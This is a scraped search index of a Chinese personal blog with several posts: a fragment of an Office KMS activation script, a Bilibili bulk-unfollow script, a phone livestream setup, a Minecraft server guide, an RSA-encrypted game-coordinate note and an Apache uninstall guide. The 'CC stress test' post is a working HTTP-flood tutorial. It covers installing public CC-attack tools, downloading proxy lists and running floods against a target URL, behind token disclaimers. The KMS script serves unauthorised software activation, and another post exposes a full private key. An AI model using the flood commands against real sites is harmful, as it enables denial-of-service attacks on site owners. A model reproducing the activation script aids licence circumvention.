..\\root\\Licenses16\\project???vl_kms*.xrm-ms\u0026#39;) do cscript ospp.vbs /inslic:\u0026#34;..\\root\\Licenses16\\%%x\u0026#34; \u0026gt;nul for /f %%x in (\u0026#39;dir /b ..\\root\\Licenses16\\proplusvl_kms*.xrm-ms\u0026#39;) do cscript ospp.vbs /inslic:\u0026#34;..\\root\\Licenses16\\%%x\u0026#34; \u0026gt;nul for /f %%x in (\u0026#39;dir /b ..\\root\\Licenses16\\standardvl_kms*.xrm-ms\u0026#39;) do cscript ospp.vbs /inslic:\u0026#34;..\\root\\Licenses16\\%%x\u0026#34; \u0026gt;nul for /f %%x in (\u0026#39;dir /b ..\\root\\Licenses16\\visio???vl_kms*.xrm-ms\u0026#39;) do cscript ospp.vbs /inslic:\u0026#34;..\\root\\Licenses16\\%%x\u0026#34; \u0026gt;nul for /f %%x in (\u0026#39;dir /b ..\\root\\Licenses16\\project???vl_mak*.xrm-ms\u0026#39;) do cscript ospp.vbs /inslic:\u0026#34;..\\root\\Licenses16\\%%x\u0026#34; \u0026gt;nul for /f %%x in (\u0026#39;dir /b ..\\root\\Licenses16\\proplusvl_mak*.xrm-ms\u0026#39;) do cscript ospp.vbs /inslic:\u0026#34;..\\root\\Licenses16\\%%x\u0026#34; \u0026gt;nul for /f %%x in (\u0026#39;dir /b ..\\root\\Licenses16\\standardvl_mak*.xrm-ms\u0026#39;) do cscript ospp.vbs /inslic:\u0026#34;..\\root\\Licenses16\\%%x\u0026#34; \u0026gt;nul for /f %%x in (\u0026#39;dir /b ..\\root\\Licenses16\\visio???vl_mak*.xrm-ms\u0026#39;) do cscript ospp.vbs /inslic:\u0026#34;..\\root\\Licenses16\\%%x\u0026#34; \u0026gt;nul cscript ospp.vbs /inpkey:NYH39-6GMXT-T39D4-WVXY2-D69YY \u0026gt;nul cscript ospp.vbs /inpkey:7WHWN-4T7MP-G96JF-G33KR-W8GF4 \u0026gt;nul cscript ospp.vbs /inpkey:RBWW7-NTJD4-FFK2C-TDJ7V-4C2QP \u0026gt;nul cscript ospp.vbs /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99 \u0026gt;nul cscript ospp.vbs /inpkey:YG9NW-3K39V-2T3HJ-93F3Q-G83KT \u0026gt;nul cscript ospp.vbs /inpkey:PD3PC-RHNGV-FXJ29-8JK7D-RJRJK \u0026gt;nul goto :EOF exit :fail cls echo 连接不了服务器……QWQ pause ","date":"2023-04-14T18:33:41+07:00","permalink":"https://blog.xpdbk.com/post/office-kms/","title":"OfficeKMS软件"},{"content":"快速取消B站（哔哩哔哩）关注的UP？ 当你互粉之后你就会发现一堆没有用的视频就出来了（我没互粉）或者你在注册新号的时候不小心关注了一堆UP\n然后你发现B站没有批量取消关注功能，只能一个一个（恼）的点击。\n1 2 3 4 5 6 7 8 9 10 11 12 13 var ms = 300; // 暂停300毫秒 var ii = 0; var xx = $(\u0026#34;.be-dropdown-item:contains(\u0026#39;取消关注\u0026#39;)\u0026#34;); console.log(\u0026#34;本页关注了\u0026#34;, xx.length, \u0026#34;个UP！\u0026#34;); tt = setInterval(function(){ if (0 \u0026lt;= ii \u0026amp;\u0026amp; ii \u0026lt; xx.length) { xx[ii].click(); // 自动点击｛取消关注｝ } else { clearInterval(tt); // 停止操作 console.log(\u0026#34;OK！本页没UP了！\u0026#34;); } ii += 1; }, ms+ii*10); // 暂停多少毫秒，再执行下一次点击，时间间隔增加变化 以Chrome浏览器为例\n按F12\n进入Console界面\n粘贴以上代码\nEnter\n即可批量快速取消关注本页20所有up主\nF5或Ctrl+R刷新一下页面，再执行一遍，就可以快速把所有up主都果断取关了。\n","date":"2023-04-09T00:00:00+07:00","permalink":"https://blog.xpdbk.com/post/bz-gzqc/","title":"b站关注批量删除"},{"content":" 本文章的方法，禁止用来滥用。\n使用之前请看视频网站TOS，禁止违反视频网站纪律。\n使用Linux进行24小时直播 材料：\n一台手机和一个不限流量的网络\n有问题请去评论区提问\n安装 Ubuntu（必须） 手机24H直播 省电和安静相比于云服务器成本更低\nLinuxDeploy（需要Root权限） linux deploy搭建环境时，从网上查阅了很多资料，感觉手机充当linux服务器时，性能差强人意。（但是直播足够了）\n如果是linux的初学者，用手机来充当服务器学习，是一个不错的选择（遇到问题，然后去解决）。 市面上可以被root的手机很少（如果你的手机是一加和小米你可以root试试）\n可root的手机 小米红米全机型： 小米红米手机一直支持官方解锁BL（一般7天解锁），通过解锁BL后就可以刷机玩机获取 root操作等，小米的解锁BL也是最神奇的，支持微信支付宝指纹支付，堪称完美。\n三星/一加/Realme/联想/华硕ROG机型 此5大机型也一样支持官方解锁BL，一般官方都提供了解锁方法，解锁时间最快，不需要 等待。有些是解锁命令解锁，有些是官方解锁工具解锁。通过解锁BL后一样支持玩机刷机 操作，但以上机型解锁BL后系统均不再支持微信指纹支付，必须依赖面具指纹模块，或者 上锁BL\n努比亚红魔/魅族/黑鲨/LG机型 以上5个机型并不支持官方解锁BL，自然解锁BL刷机全靠开发者实现。庆幸的是以上机型 基本都可以飞官方解锁BL刷机操作，然后获取完美root等等。非官方解锁BL可能会使得手 机失去保修功能，希望保修的小伙伴，需要在保修之前刷回官方系统，再回锁BL\nOPPO能深度测试机型 OPPO机型目前能root的并不多，都需要通过官方 深度测试，官方未开放深度测试的机型目前并没有任何解锁刷机root方法，已知只有这些机型可申请测试，并且申请时间为每月的1号或者15号，需要解锁root的用户请及时申请，解锁BL会导致数据清空，请备份数据再刷 机。指纹支付也会一起失效，同一加机型\n支持Find X/R17 Pro/Reno/Reno Ace/Find X2系列/Ace2/Reno3系列/R17全网通/K1/K3 /K5/R15x正式版/Reno4、Reno4 Pro、Reno4 SE 5G/Reno5 Pro+、Reno5 Pro、Reno5\nroot不规范变砖两行泪\n使用时需要注意的问题与总结：\n在Linux Deploy设置中，Path里需要将BusyBox安装路径设置（默认/system/xbin） BusyBox装了就开不了鸡了 启用允许挂载Android上的资源时，挂载点名称要注意，文档里名称，与自己手机使用的名称不一致（可通过文件管理工具查看） 下载网速是硬伤，安装系统时连接的国外服务器，有可能下载超时 不要从应用商店等下载apk，直接到github上，下载最新apk 以上问题，都可能造成ssh等服务启动失败，不能正常使用。\nSD卡挂载示例\n使用环境 下载 Xshell\n已ROOT手机一台\n一台电脑\n使用ssh访问linux deploy\n前置服务器安装说明 手机安装 BusyBox app https://github.com/meefik/busybox/releases 应用界面，选择install(使用默认配置/system/xbin) 请自己试试如果完蛋了就重新安装Linux Deploy\n手机安装 linux deploy Releases · meefik/linuxdeploy · GitHub 修改linux deploy配置 linux deploy界面，选择左上角图标-配置：\n属性 配置 屏幕常亮 选中 锁定Wi-Fi 选中 CPU唤醒 选中 PATH变量 与BusyBox中配置一致 /system/xbin 修改后选择“更新环境”，保存配置。\n修改linux安装属性 linux deploy界面，选择右下角图标：\n属性 配置 说明 发行版本 GNU/Linux Ubuntu Ubuntu 安装最简单了 架构 arm64 可以通过linux deploy右上角图标-状态，查看手机cpu架构 发行版本呢 默认 镜像大小 4096 最高支持4096MB 文件系统 ext4 保持默认 用户名 root ssh登陆时使用 用户密码 自己设置 英文大小写和数字 本地化 zh_CN.UTF-8 中文包即可 启用 允许使用初始化系统 不启用 启用允许挂载android上的资源 选中 自己按照上面的方法挂载 挂载点列表 /mnt/sdcard:/mnt 源名称：挂载点名称 注：不同手机名称不一样,可以通过MT文件查看工具查看 启用SSH服务器 选中 默认 安装Ubuntu linux deploy右上角图标-安装\n安装依赖项 1 sudo apt install ffmpeg screen 直接按Y即可\nTermux（不用root的通用方法） 事先说明这种方法性能更弱\n通过 Termux 和 Ubuntu 22 在 Android 上运行 FFmpeg。 但是它需要手动设置大量命令，小心不要跳过任何步骤。 注意，这可能需要10至20分钟的时间或更长的时间，取决于您的技术知识水平。 互联网速度和 CPU 速度。\n安装 Termux 警告\nTermux 的Play 商店版本已经过时，不支持，不要使用，请使用 Github one在新窗口打开 转到 Termux Github 最新版本在新窗口打开 , 下载 debug_universal.apk, 解压缩它并运行它。\n提示\n如果您的文件管理器不允许您运行 APK 文件， 安装并使用 MT文件管理器 并允许它在接到请求时安装第三方应用程序。\n重要警告\n一旦您安装了 Termux，打开它，拉下安卓菜单以通知， 在 Termux 通知中，向下拖动直到您看到以下选项：Exit | Acquire wakelock, 点击Acquire wakelock 并允许Termux在询问时拥有电池优化排除权限。 如果您不这样做，您的性能将会变得更差，Termux 可能会在后台运行时被 Android 杀死！\n安装 Ubuntu 22.04 用于安装 Ubuntu 22。 在 Termux 中，您需要 wget and proot中, 我们将在下一步安装它们。\n一旦您安装 Termux 后打开并运行以下命令（按顺序排列）：\npkg update\npkg upgrade\npkg install proot wget\n提示\n如果你被要求在更新/升级命令过程中按Y/N 键，只需输入 Y 并按Enter\n然后您需要使用以下命令下载安装脚本：\n1 wget https://raw.githubusercontent.com/MFDGaming/ubuntu-in-termux/master/ubuntu.sh 在脚本下载完毕时运行它：\n1 bash ubuntu.sh 然后您将被问到一个问题，输入 Y 并按 Enter。\n安装完成后，您可以使用 Ubuntu 启动：\n1 ./startubuntu.sh 安装依赖 首先，我们需要更新 APT 软件包管理器仓库并安装依赖项。\n要更新 APT 存储库，请运行以下命令：\n1 apt update -y \u0026amp;\u0026amp; apt upgrade -y 完成后，我们需要安装依赖项，命令如下：\n1 sudo apt install ffmpeg screen 介绍 FFmpeg FFmpeg 本身是一款非常强大的命令行实用程序，在 Linux 发行版、Windows 以及 macOS 等系统上均可运行，支持多种架构。FFmpeg 是用 C 语言和汇编语言编写的，性能强大，提供跨平台支持。\nFFmpeg 安装 在 Ubuntu 等 Linux 发行版上， FFmpeg 的安装比较简单。打开终端，运行以下命令安装即可。\nUbuntu 及与其相似的发行版 1 sudo apt install FFmpeg FFmpeg 安装完成后，可输入以下命令查看安装是否成功。\n1 ffmpeg --version 文件传输 这关非常重要关乎你的直播是否能打开\n需要安装Xftp\n然后你发现最右边有一个Xftp按钮 点一下它（必须要连接SSH之后才能用）\nlinuxdeploy路径是这样的\n1 /root 而Termux需要安装SSHD才能用SFTP\n1 pkg install sshd 安装之后运行\n1 sshd 设置密码\n1 passwd 查询手机ip，以实际手机ip为准\n1 ifconfig 查询当前用户\n1 whoami 确认ssh服务的监听端口\n1 netstat -ntlp | grep sshd 默认SSH端口就是这台手机的8022端口\n默认路径在这\n1 /data/data/com.termux/files/home/ubuntu-fs/root 启动直播前的准备 Youtube准备\n在Youtube直播不能直播有版权的东西（简单来说就是Youtube上面火的东西）\n例如我直播的内容是丁真所以也没事\n有能力的可以点开链接看雪豹直播doge\nI Got Smoke 丁真无限循环 24H*7Days - YouTube Youtube直播对于你们来说太难了\nBilibili直播 账号需要实名（满18岁）\n需要IP地址在中国大陆\n不在中国大陆的可以使用归雁加速器（自己搜）\nhttps://live.bilibili.com/24595202 如果你具备了这些条件请继续往下看\n直播脚本 请把以下的内容封装成 .sh格式 例如： 535ir.sh\n创建一个文件夹\n1 mkdir zhibo 进入文件夹\n1 cd zhibo 添加脚本\n1 nano zhibo.sh 没NANO就安装一下\n1 apt install nano Youtube直播脚本 1 2 3 4 5 #!/bin/bash while true do ffmpeg -re -i \u0026#34;视频.mp4\u0026#34; -vcodec copy -acodec copy -f flv \u0026#34;服务器地址/直播码\u0026#34; done Bilibili直播脚本 1 2 3 4 5 #!/bin/bash while true do ffmpeg -re -i \u0026#34;视频.mp4\u0026#34; -vcodec copy -acodec copy -f flv \u0026#34;服务器地址/直播码\u0026#34; done 运行直播 添加一个虚拟终端\n1 screen -S 自定义名字 1 运行 ./脚本名.sh 回到虚拟终端\n1 screen -r 你刚才自定义的名字 从虚拟终端退出\n1 在 screen 终端 下 按下 Ctrl+a d键 踩坑的话请自行去Bing搜索搜索相关问题\n或者在评论区提问\n","date":"2023-03-25T00:00:00+07:00","permalink":"https://blog.xpdbk.com/post/zhibo-24h/","title":"使用linux进行24小时直播"},{"content":"CC压力测试教程 仅供测试不要用来做违法的事情\n脚本介绍 kolbwang CC-attack（方便但是太老了） 1 2 3 pip3 install requests pysocks git clone https://github.com/kolbwang/cc-attack.git cd cc-attack 使用\n1 python3 cc.py 这个脚本很老了 总是会停攻击\n脚本开源库：GitHub - kolbwang/cc-attack Leeon123 CC-attack 安装（windows） 1 2 3 4 pip3 install requests pysocks git clone https://github.com/Leeon123/CC-attack.git # 也可以直接下载下来 cd CC-attack 用法（Windows） 1 python cc.py \u0026lt;arguments\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 =============== CC-attack help list =============== -h/help | showing this message -url | set target url -m/mode | set program mode -data | set post data path (only works on post mode) | (Example: -data data.json) -cookies | set cookies (Example: \u0026#39;id:xxx;ua:xxx\u0026#39;) -v | set proxy type (4/5/http, default:5) -t | set threads number (default:800) -f | set proxies file (default:proxy.txt) -b | enable/disable brute mode | Enable=1 Disable=0 (default:0) -s | set attack time(default:60) -down | download proxies -check | check proxies ===================================================== 下载代理列表 将 socks5 代理下载为 proxy.txt：\n1 python cc.py -down -f proxy.txt -v 5 使用自定义代理列表（socks4.txt）攻击目标 30 秒：\n1 python cc.py -url http://target.com -f socks4.txt -v 4 -s 30 启动脚本 新建.cmd文件\n1 2 # 填入下面的链接 嫌烦就去掉这个注释 python cc.py -url https://网站.com -v 5 -s 600 # 默认是proxy.txt 不要用来攻击无辜的网站！！！\nhttp代理下载\nhttps://pvphack.lanzoue.com/imPc30n8n9qf 密码:6dh1\n项目GITHUB链接\nGitHub - Leeon123/CC-attack: Using Socks4/5 or http proxies to make a multithreading Http-flood/Https-flood (cc) attack. 不要拿去违法OwO\n","date":"2023-02-10T00:00:00+07:00","image":"https://blog.xpdbk.com/post/cc-gongji/awa_hu3e033f184fd8d838243b9fa585621de7_267132_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/cc-gongji/","title":"如何进行免费的CC压力测试"},{"content":"基于VPS搭建Minecraft服务器（Linux） 一、为啥要搭建 我们玩Minecraft的时候，可能需要联机玩。但是在 Minecraft Java 上只有 LAN 在线。这时候我们就需要搭建一个服务器，让不同地区的玩家可以一起联机。\n英文版正在制作\n二、安装环境 虚拟专用服务器vps系统版本：Ubuntu 22.04 64位 我的世界国际版版本：1.12.2 Java版 三、搭建步骤 SSH连接上服务器\n输入以下命令，安装Jdk环境包\n不懂SSH的可以百度或者bing\nJdk 环境包 对于1.16及之前版本，需要安装Jdk8\n1 sudo apt install openjdk-8-jdk 对于1.17需要安装Jdk16\n1 sudo apt install openjdk-16-jdk 1.18及以上需要Jdk17\n1 sudo apt install openjdk-17-jdk 服务端下载 进入 https://mcversions.net/ ，找到你想要下载的服务端版本\n复制 server.jar 的链接\n例如以下页面\n1.12.2 输入下面的命令，下载mc的服务端\n1 wget -N 复制的链接 输入下面的命令，启动服务端\n1 java -server -XX:+UseG1GC -Xmx2048M -Xms1024M -jar server.jar nogui 打开eula.txt，修改红框部分为eula=true\n修改server.properties文件，修改以下部分\nview-distance=10 max-build-height=256 server-ip= level-seed= gamemode=0 # 1为创造，2为旁观 server-port=25565 # 服务器端口，建议修改 enable-command-block=false allow-nether=true enable-rcon=false op-permission-level=4 enable-query=false generator-settings= resource-pack= player-idle-timeout=0 level-name=world motd=A Minecraft Server # 服务器介绍 announce-player-achievements=true force-gamemode=false hardcore=false white-list=false pvp=true spawn-npcs=true generate-structures=true spawn-animals=true snooper-enabled=true difficulty=1 network-compression-threshold=256 level-type=DEFAULT spawn-monsters=true max-tick-time=60000 max-players=20 # 服务器最多承受玩家人数 use-native-transport=true online-mode=true # false为取消正版验证 allow-flight=false resource-pack-hash= max-world-size=29999984 创建一个screen，然后编写一个启动脚本\n创建脚本文件\n1 nano start.sh 填写脚本内容\n1 2 3 4 5 6 #!/bin/sh for ((i=0; i\u0026lt;10; i ++)) do java -server -XX:+UseG1GC -Xms1024M -Xmx2048M -jar server.jar nogui -noverify -XX:+AggressiveOpts -XX:+UseCompressedOops done Ctrl+X 保存\n提权\n1 chmod 777 start.sh 1 ./start.sh 注意 需要停止服务器端，请进到screen，然后输入 /stop 命令正常关闭服务器程序\n你可以使用下面的命令检查是否已经在你的服务器上安装了screen\n1 screen -v 1 apt-get -y install screen 如何启动一个 screen 会话 1 screen -S name 将 “name” 替换为对你会话有意义的名字（例如mc）\n从 screen 会话中分离 要从当前的 screen 会话中分离，你可以按下 Ctrl-A 和 d。所有的 screen 会话仍将是活跃的，你之后可以随时重新连接。\n重新连接到 screen 会话 如果你从一个会话分离，或者由于某些原因你的连接被中断了，你可以使用下面的命令重新连接：\n1 screen -r mc 如果你有多个 screen 会话，你可以用 ls 参数列出它们。\n1 2 3 4 5 6 7 8 9 10 11 12 # 输入 screen -ls # 列出会话 There are screens on # 114514是会话号 114514.session (Detached) 1919810.homo (Detached) 514441.session1 (Detached) 3 Sockets in /var/run/screen/S-root 在我们的例子中，我们有三个活跃的 screen 会话。因此，如果你想要还原 “session2” 会话，你可以执行：\n1 screen -r 1919810 1 2 # 或者使用字符 screen -r -S homo 删除Screen 在当前screen下，输入Ctrl+D，删除该screen.\n服务器开好了之后的样子 Ctrl+c退出 按照上面screen重新搞一次\n然后键入服务器公网IP（有的服务器需要把防火墙或者安全组关了才行）\n进入游戏\n","date":"2023-02-10T00:00:00+07:00","image":"https://blog.xpdbk.com/post/mc-server/game_hu9a1df71d11008168eefdfe4a7f4c554c_45444_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/mc-server/","title":"如何用VPS搭建Minecraft Java原版服务器"},{"content":"5B5T 基地坐标 记录 DES: U2FsdGVkX1/Fez/+ozPEvfaKewD113NRTsNEJ3tJqJWf7kw4SmPYWLJ/+BFKdJTb\nRSA最终加密：OpU0DYem5ccpMPNECxiOh0DtpWMsYHgQqxeDIth+qGvJZvms03wmR6B1zEVbBGY1pQ5X6EAOocAsDG4SCN254QLvitvW2eO8AUbc+xd4b7OGm5kHRmoZRK3FeeyCwljcXULjLb89I+Kvw02qsA544+8UzTyYfVc1EDSEvWfpuELrMBvY0OTT/yDz34QS1lF6750/cMbwehrNjy5QE614hrXCpR7yEUt6y9q62otaRuLBorCACXHbZVBwT+9j81yTuKLk5vT7W8NutU2c1OYvxN9UN973KnTfhd2fYwUfVHT0266z4GQBsQHn8DDFLnHbzCZNcxyc9N2wu6Dj3UsEG8gPG29EBttdecMCKB1B1r/ViEe6QwPd5r+y6BZW5dVkivCWH6FHs3NCrCsPNYRMZpkKOBPd7jVwqIHCcWkd3ichZsA9GSCROhRw554fWVHykNi53+CUxL4P2xoxDM1kauaqFsVfPjowlrskKJ1rK4HFI5JzlkUPb59DxC+CiB1JGsa35Y96ZSvl2VfdVYF1h7ASwKP0XNwzV2RNXYoym/QMKHCjk+OW2zyGemIO6auPd86KMF7XdjdwCoABrto1gcf7c8imkWDTdHAdhZ56lx9v/Oly9ZcG7ItR/2gmpvGSigL7TvgV5tBSWOFhqdUzfJE4ktHHZHVLXw/gL8OheTUeDa2fWVjWNUvbOXuNb5xAz8okRUAJx12oCV4Lb9ks5w6egII9FtDBbZ2RS6DtAu/XqmlMBSXRZyaKkTYXHSrC9WgWxZqESY9dPMJuVePRNWJ3aUMwBj6x3svOC2wi8D3CgxV3XG0+C2rhmwj4G2Ab7ljmk2bePPVDwY96NgRrBYPXHPrCIGyAJGhRXg+153ZeWJ2BfEWCQBTmgT6BfmCsW0hXSvSansGBEGJlHdGKypb2E8diDqRNuYgrH22mDR4UJJLH50DTsW3BtT99LYdvSFWAQL0pCIoDUlUWaVD9OMU165GAxvU731eiBN4oUs+Lc/FJb5JHIUx7RXt9aHpNE4Uwepzs16lmBKsLBMUh4eua7Flpx7002yRqAdPpZ/Xfzm27cppnNgLCDz39m57ZVfLpO/zyh8DGkKVCNYY+jOjGplKMdx7NpQ3Vk75QEktOYHq66qvDejvqYeYtf8MuNhN1hhouo8L1R80EI0wrp3L1RhQMm5g6ladADHYtFW59O5qehQfJB0JQLTV63RZ7/UzEyrle67LjIeFkjBNH4OcZA2JXtx9uHVgZVSapkn0/Cia59qBTcVUKPviK+0SQUeN2m+3wjaVqnDYSS2HI1TwotChL2FYu8uIMxhmkt9j8yAqA0Q69y0OHuJOWvheiBToLFmkCkHVf37bYwFfjNQ==\n公钥私钥加密长度: 4096\n类型: RSA\n公钥: -----BEGIN PUBLIC KEY----- MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAu7MgBFkZ6nxvzUR2JVSv ImGt8RKRKP8memL9R3MWcn6T/gocn6/kz6yR67ceekOMEhjJDsalwv/qxbMCbPSi D/WPB2PZvbe/y6Nrvab5RdcrbJlxlgaqEHYSDuGqJu3iMgjdpzqZjTfCv+kIw5mN 5GgO9VkslEIzUxCX7xoAkHGatwQrwcK3vcNSfa2hf9Neg0MqwMUYqgFIED7fwlZ3 r1MZ5oSlN5c3YUWostJH8fBWYO4v2xkBDN1fnGkry5SR95vLU9KqbzlkRNCPZhHe 9dNsDbJdlUo0N/ZniVxMiqtLt1X9GwT6umdbKGs4KEqwLeYULbxHcjrICnW3SW6Z E2+YoekcnmBfkgx1LcsDVbsPpYBeOFDV/fjRaxFcC+g5H+dI/p59nYKuV57Lz0bs Y+FFO2iZOiCmpvH6bvEHcQnSyK04CdFxIVo6i5yJPN/gguzbLBE4Uh0jPDNMmP/N UdhzXQsegJGJOWySg4PZhroTtzbzke2ka+GW/X6duC7kVHx+Bm1fB1DVkw4Bvitz xITqdBkg9pcqB6CBWfCEwJSn/VN6xpTGiJN+d9C6RzaBsj6o20dxMJmDg5venK1B 3qnuxlwAyOL+kJPFMg937ZxMdIY71q/1bW/IrBmMwkn0SmSfpxmOfrO+BF2XB6Y/ 6DrCsAYMz2Ur3G3e6yDGTbsCAwEAAQ== -----END PUBLIC KEY-----\n私钥: -----BEGIN PRIVATE KEY----- MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC7syAEWRnqfG/N RHYlVK8iYa3xEpEo/yZ6Yv1HcxZyfpP+Chyfr+TPrJHrtx56Q4wSGMkOxqXC/+rF swJs9KIP9Y8HY9m9t7/Lo2u9pvlF1ytsmXGWBqoQdhIO4aom7eIyCN2nOpmNN8K/ 6QjDmY3kaA71WSyUQjNTEJfvGgCQcZq3BCvBwre9w1J9raF/016DQyrAxRiqAUgQ Pt/CVnevUxnmhKU3lzdhRaiy0kfx8FZg7i/bGQEM3V+caSvLlJH3m8tT0qpvOWRE 0I9mEd7102wNsl2VSjQ39meJXEyKq0u3Vf0bBPq6Z1soazgoSrAt5hQtvEdyOsgK dbdJbpkTb5ih6RyeYF+SDHUtywNVuw+lgF44UNX9+NFrEVwL6Dkf50j+nn2dgq5X nsvPRuxj4UU7aJk6IKam8fpu8QdxCdLIrTgJ0XEhWjqLnIk83+CC7NssEThSHSM8 M0yY/81R2HNdCx6AkYk5bJKDg9mGuhO3NvOR7aRr4Zb9fp24LuRUfH4GbV8HUNWT DgG+K3PEhOp0GSD2lyoHoIFZ8ITAlKf9U3rGlMaIk3530LpHNoGyPqjbR3EwmYOD m96crUHeqe7GXADI4v6Qk8UyD3ftnEx0hjvWr/Vtb8isGYzCSfRKZJ+nGY5+s74E XZcHpj/oOsKwBgzPZSvcbd7rIMZNuwIDAQABAoICAGgJJ9ThIhkzMbDfonCcmJoA 9C1rsiO8ELLDTUmeA7IgcJzdM/JaxwNIznSNQgpYiDm7nS1gc546xQEhcFW93lnk LIvXD2g1gcw4X052TzIjykDeZ/PU68xF9UpkUDBVqAs9mMXJGDUK1BoU6zOnV9ti xe+9ppTigJoo113C1s84+J06ZZp29+rpaT6Zz6sPGBK/VuIUHNCV90Bx6QpJbPsz n2aC3SSL3zk+J/w9y3zRTr9ZJhNVr5xW01jZflnPlnxc0P08BhWyBN6TjvfvLdqp ffm1hGNsBreCDu82xoIR4dzTf3/LacGJ6h/kFfNXOoGmRkb3Vc59wETz7Ex6TcNh G4mkYnGCb7SSSp+oIqBYqdef6cZLM6SzX8DEabLDBRs3FiaAGc7aEDMnntUacxIq yYwOrxZ9yOFXknIzkgk7BVlcFomSSV0E00vS0Sibv2LZJpUAy6Uh6NX+zJG8u53Q P3gvvc/swiONPuvMzgB25k5KNi6OYO2kfZBY1C5V8TWrGY6nsqZxwvLZLMqbIFbV MPnB1TMbPX5dOXjtVwAOf0I7OoY1W9xepMm3/JtckrKMlqZhR5M/TnEY1aLMRpQA 1aZ+T8A2v9bH5F5Gf+97UJCeAbNB/aUbISiwlEWtMQGrNXvQcX2cYl3/jctkMyt9 VCkb0rkFpGAKbM14Yt3RAoIBAQDvyw4OnJ5Ob8PxyIJMxi/0pH1g2PEGWXk1wuYW aeleTLulqbqPOUuKzz3Bu4wFfItPA04MqyCzVW4EfnLuy+l3vSN4++YVAUjTuIsH vjzJPQQ75dwfgjq2I55Y4BDaEtKy1/Ao0RPXH6L4FT3XKRywc9dQGP0br61pJQyo ldJFHnk0/veHofqVnGiUQkHtplkKxiYvkoT6ypegvf3yHf+Fkae75/PLR5XxcEom +C4i8jXFhMOLmB/0/TtXDHsJq8W78zwlfMeCHN8N9Z82ioO+nt1PlllTKlGxKc0h dDNXC3QLLE//wNF1bIaYyd3vFJlc9bhh1RMInwDIz9BYoebjAoIBAQDIYr1JR2N3 +5wNjsgoLhOeYzSDq26fh2TAi2vMZNaufJh9r2+KdjsXz3JwCCyU9Jhc1u7t1xol kjwL6Ol3d0Ba+eWNNACMmVini1JPZX/aXlrWPlSJVymJ5dvU1p71PUJK9PJOOHtg Oa08onm8fbEI4QxnK9HBfVwDng8mzjEt8kljFeztPe0XnsIZ9gjPqieMuGhc5yhy oFVjxnHw4oMkq+Xmal4jTTHGZCCBzb64I9srFOQ5ZGWtsg0o27f0m8+Y/DptuVR8 ZtSy194JtzYg6Snf7MQg4/M5IA19zuVwfa5lS9peKXLghDPKtWucC+ZMn/dPc6P5 glMAnv5xSV1JAoIBAQCFXegplE4vzdWrShu+W5QcesgI71/OakER955E5Q8YlZDg KLBMLE+pmm38rDTKcGSCw5HLVfpQA7m24iVGTz9Ai3+JMIDdOeOpbcBVxCbGvhr2 vXdaRvIkj1bok2aMA2AQfC1kZjSkt0HKvPWyD3mXYjZkpCFSHrlR+3s44GscakB7 iztcwmg+gclgfCFy7cwkQ+TFHLa9TaRbkJAG80xEm6gwyGc9rkjlCdEUL4Bpi1EA 1EB2CVvsxFMWrShZTqIhUL0pFGdaJHiiqPOuQAfaIz1voG155dWdtWQTsS9EwGgA NtsfobxdlMiffdbjvA84NqogL4PwjY7AIWT9hr6FAoIBAGsPzkBDoxJs3RClU62c CKFcMaeTxXP4e80f8IVw7v6k1Th5rieVSbdL/8F5rJAdKvaXY2qxvWeLfQeD9pD8 pua0k3/g49Y67BIALwb6nNfIB9Jl1PbYGfpyVASgcqdmhm/T9U3zgX+E8VjvGgmq QhcTXnQVBmnRl4LbRQ8fpUj+JVWKVl7e8jjnep8yQ7zoFV9q+19/pa2wmk7HrQLd kuHZ8egstoU37jsoLfIMQjTR+3xGGjXLvUOTWNKWqe9H/B+py3HqTgh1THkNOrWI LKRizxuzvYoxIDdKN8sa6p0ymSXH5DDhBl6MY7uPOKJT/US9Rv4tM9PQXJZ9XEac wvkCggEBAM75/6UJMcXygCvdJYSYwL3ilEEBoTb/NSPRSngAfAeJWpE3zx1OYQ5E Zr0I+poglwJnsrNpkvhNsJMAbU71l1KK10jqQy0ISPQlcbAN1BTkUYW02qYl6VQb zjKPpvY94YVvlm7RKOafA8ihWfkNBhWSEkrNOqHjcBzkaDE9WUUp9bUaIHDEexd2 MYxvgIS5pl46E+gAl0kszhKgS28lOX4JBrrx/WuzjK5t5JW/WFZh56nqBk4Xm3on /ZFc/aDW/LAuID+7inbcdw2koO7mUW9Gmze9pyvX6IO9Ruz8jihJXvMbFgPoBHf0 rWIhIOVf49H66PICZwb2hhQ1HtCESsg= -----END PRIVATE KEY-----\n区块: 117超长加密\n填充类型: OPENSSL_PKCS1_OAEP_PADDING\n过程（从左到右）：明文DES-bs32-bs64-UrlEncode-二进制-rsa\n本文仅用于群内人员查看坐标加密方法\n","date":"2022-12-18T00:00:00+07:00","permalink":"https://blog.xpdbk.com/post/5b5t-haha/","title":"5B5T 基地坐标 记录"},{"content":"删除apache 系统默认安装了apache2现在就来卸载此服务。\n1、查找web服务 使用如下命令：\ndpkg -l | grep apache2\n2、删除apache2 删除命令如下：\napt-get --purge remove apache2\napt-get --purge remove apache2-doc\napt-get --purge remove apache2-utils\napt-get --purge remove apache2-bin\napt-get --purge remove apache2-data\n3、删除多余的文件 上面的执行完之后，执行如下的命令：\nfind /etc -name \u0026quot;apache\u0026quot; |xargs rm -rf\nrm -rf /var/www\nrm -rf /etc/libapache2-mod-jk\n4、最后 80端口释放，没有问题了。\n","date":"2022-11-11T00:00:00+07:00","image":"https://blog.xpdbk.com/post/web-hax/hax_hu791f7d7143d0d885244b37d9b598f69c_5670_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/web-hax/","title":"卸载Apache进阶版"}]